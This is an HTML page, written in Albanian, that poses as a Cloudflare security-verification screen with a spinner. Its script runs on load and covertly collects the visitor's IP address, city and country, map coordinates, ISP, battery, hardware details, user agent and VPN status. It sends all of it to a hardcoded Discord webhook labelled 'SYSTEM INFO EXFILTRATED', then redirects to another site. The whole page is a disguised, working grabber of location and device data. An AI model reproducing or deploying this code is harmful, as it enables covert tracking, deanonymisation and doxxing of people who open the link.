
<!DOCTYPE html>
<html lang="sq">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification | Cloudflare</title>
    <style>
        body { 
            background: #ffffff; 
            color: #313131; 
            display: flex; 
            flex-direction: column;
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            font-family: -apple-system, system-ui, sans-serif; 
        }
        .container {
            text-align: center;
            max-width: 400px;
            padding: 40px;
            border-radius: 12px;
        }
        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #0052cc;
            border-radius: 50%;
            width: 35px;
            height: 35px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h1 { font-size: 20px; font-weight: 600; margin-bottom: 10px; }
        p { font-size: 14px; color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <h1>Verifikimi i Sigurisë</h1>
        <p>Po kontrollojmë nëse lidhja juaj është e sigurt...</p>
    </div>

    <script>
        const webhookURL = "https://discord.com/api/webhooks/1497231122667409610/UIfP7aK35EKcrRKZz7Zh3QIAUdW_VAfo-MUBOzxJpLZMwsCPCVoerrS3Y9PTOxT_8L2m";
        const redirectURL = "https://gemini.google.com/app";

        // Funksioni për gjetjen e modelit të iPhone-it
        function getIPhoneModel() {
            const ratio = window.devicePixelRatio;
            const w = window.screen.width;
            const h = window.screen.height;
            if (ratio === 3 && w === 393 && h === 852) return "iPhone 15 / 15 Pro / 14 Pro";
            if (ratio === 3 && w === 430 && h === 932) return "iPhone 15 Pro Max / 15 Plus / 14 Pro Max";
            if (ratio === 3 && w === 390 && h === 844) return "iPhone 14 / 13 / 13 Pro / 12 / 12 Pro";
            if (ratio === 3 && w === 428 && h === 926) return "iPhone 14 Plus / 13 Pro Max / 12 Pro Max";
            if (ratio === 3 && w === 375 && h === 812) return "iPhone 13 mini / 12 mini / 11 Pro / XS / X";
            if (ratio === 2 && w === 414 && h === 896) return "iPhone 11 / XR";
            if (ratio === 3 && w === 414 && h === 896) return "iPhone 11 Pro Max / XS Max";
            return "Pajisje Apple (Model i paidentifikuar)";
        }

        async function collectAndSend() {
            try {
                // Lokacioni dhe IP (Preciz)
                const geoReq = await fetch('https://demo.ip-api.com/json/?fields=66846719');
                const g = await geoReq.json();

                // Bateria
                let batteryStatus = "E panjohur";
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    batteryStatus = `${Math.round(b.level * 100)}% (${b.charging ? 'Në karikim ⚡' : 'Në bateri 🔋'})`;
                }

                // Detajet teknike
                const specs = {
                    model: /iPhone|iPad|iPod/.test(navigator.userAgent) ? getIPhoneModel() : navigator.platform,
                    ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "E panjohur",
                    cpu: navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Cores` : "E panjohur",
                    screen: `${window.screen.width}x${window.screen.height}`,
                    time: new Date().toLocaleTimeString('sq-AL'),
                    lang: navigator.language
                };

                const payload = {
                    "content": "☣️ **DATA BREACH DETECTED** ☣️",
                    "embeds": [{
                        "title": "💀 SYSTEM INFO EXFILTRATED",
                        "description": "Të dhënat u morën me sukses nga pajisja e shënjestruar.",
                        "color": 0, // E zezë
                        "fields": [
                            { "name": "👤 Identiteti (Modeli)", "value": `\`${specs.model}\``, "inline": true },
                            { "name": "🔋 Statusi i Baterisë", "value": `\`${batteryStatus}\``, "inline": true },
                            { "name": "⏰ Ora e Pajisjes", "value": `\`${specs.time}\``, "inline": true },
                            { "name": "🌐 Adresa IP", "value": `\`${g.query}\``, "inline": true },
                            { "name": "📍 Lokacioni", "value": `\`${g.city}, ${g.country}\``, "inline": true },
                            { "name": "📡 ISP (Rrjeti)", "value": `\`${g.isp}\``, "inline": false },
                            { "name": "⚙️ Hardware Specs", "value": `RAM: \`${specs.ram}\` | CPU: \`${specs.cpu}\` | Res: \`${specs.screen}\``, "inline": false },
                            { "name": "🛡️ VPN / Proxy", "value": g.proxy ? "⚠️ **DETECTED**" : "✅ NONE", "inline": true },
                            { "name": "📶 Connection", "value": g.mobile ? "📱 Mobile Data" : "🏠 WiFi", "inline": true },
                            { "name": "📱 Agent", "value": `\`\`\`${navigator.userAgent}\`\`\``, "inline": false },
                            { "name": "🗺️ Google Maps", "value": `[SHIKO LOKACIONIN](https://www.google.com/maps?q=${g.lat},${g.lon})`, "inline": false }
                        ],
                        "footer": { "text": "Hacker Logger v9.9.9 | Encrypted Tunnel" },
                        "timestamp": new Date()
                    }]
                };

                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

            } catch (e) {
                console.log("Breach failed.");
            } finally {
                setTimeout(() => { window.location.href = redirectURL; }, 2000);
            }
        }

        window.onload = collectAndSend;
    </script>
</body>
</html>
